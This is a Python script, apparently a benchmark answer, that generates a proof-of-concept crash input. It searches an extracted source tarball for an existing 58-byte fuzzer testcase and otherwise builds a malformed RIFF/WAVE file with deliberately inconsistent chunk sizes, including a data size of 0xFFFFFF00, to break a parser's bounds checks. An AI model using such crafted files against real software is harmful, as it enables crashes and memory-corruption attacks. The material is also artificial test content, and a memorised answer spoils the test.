import os
import tarfile
import tempfile
import struct


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="pocgen_")
        try:
            self._extract_tarball(src_path, tmpdir)
            data = self._find_embedded_poc(tmpdir)
            if data is not None:
                return data
        except Exception:
            pass
        return self._build_manual_poc()

    def _extract_tarball(self, src_path: str, dst: str) -> None:
        with tarfile.open(src_path, "r:*") as tf:
            # Simple extraction; environment is controlled
            tf.extractall(dst)

    def _find_embedded_poc(self, root: str) -> bytes | None:
        target_len = 58
        content_keywords = [b"RIFF", b"RIFX", b"WEBP", b"WAVE", b"AVI "]
        name_keywords = ["poc", "oss-fuzz", "clusterfuzz", "testcase", "crash", "regress", "issue", "bug"]

        best_fallback = None

        # First pass: exact target length
        for dirpath, _, files in os.walk(root):
            for fname in files:
                path = os.path.join(dirpath, fname)
                try:
                    size = os.path.getsize(path)
                except OSError:
                    continue
                if size != target_len:
                    continue
                try:
                    with open(path, "rb") as f:
                        data = f.read()
                except Exception:
                    continue

                lower_name = fname.lower()
                if any(kw in data[:32] for kw in content_keywords) or any(
                    kw in lower_name for kw in name_keywords
                ):
                    return data

                if best_fallback is None:
                    best_fallback = data

        if best_fallback is not None:
            return best_fallback

        # Second pass: small RIFF-like files
        small_candidates = []
        for dirpath, _, files in os.walk(root):
            for fname in files:
                path = os.path.join(dirpath, fname)
                try:
                    size = os.path.getsize(path)
                except OSError:
                    continue
                if size == 0 or size > 512:
                    continue
                try:
                    with open(path, "rb") as f:
                        data = f.read()
                except Exception:
                    continue

                if any(kw in data[:64] for kw in content_keywords):
                    score = 0
                    lname = fname.lower()
                    for s in name_keywords:
                        if s in lname:
                            score += 1
                    small_candidates.append((score, size, data))

        if small_candidates:
            small_candidates.sort(key=lambda t: (-t[0], t[1]))
            return small_candidates[0][2]

        return None

    def _build_manual_poc(self) -> bytes:
        # Construct a 58-byte RIFF/WAVE file with intentionally inconsistent
        # RIFF and data chunk sizes to exercise size-vs-boundary checks.

        riff_id = b"RIFF"
        riff_size = 36  # Deliberately does not match actual file size (58 - 8 = 50)
        wave_id = b"WAVE"

        # fmt chunk: standard PCM format
        fmt_id = b"fmt "
        fmt_size = 16  # PCM
        audio_format = 1  # PCM
        num_channels = 1
        sample_rate = 8000
        bits_per_sample = 8
        byte_rate = sample_rate * num_channels * bits_per_sample // 8
        block_align = num_channels * bits_per_sample // 8

        fmt_chunk = (
            fmt_id
            + struct.pack(
                "<IHHIIHH",
                fmt_size,
                audio_format,
                num_channels,
                sample_rate,
                byte_rate,
                block_align,
                bits_per_sample,
            )
        )

        # data chunk: declare huge size but provide only a few bytes
        data_id = b"data"
        declared_data_size = 0xFFFFFF00  # Very large, exceeds remaining RIFF space
        actual_data = b"\x00" * 14  # So total length becomes 58 bytes

        data_chunk = data_id + struct.pack("<I", declared_data_size) + actual_data

        wav = riff_id + struct.pack("<I", riff_size) + wave_id + fmt_chunk + data_chunk

        # Ensure final length is exactly 58 bytes
        target_len = 58
        if len(wav) > target_len:
            wav = wav[:target_len]
        elif len(wav) < target_len:
            wav += b"\x00" * (target_len - len(wav))

        return wav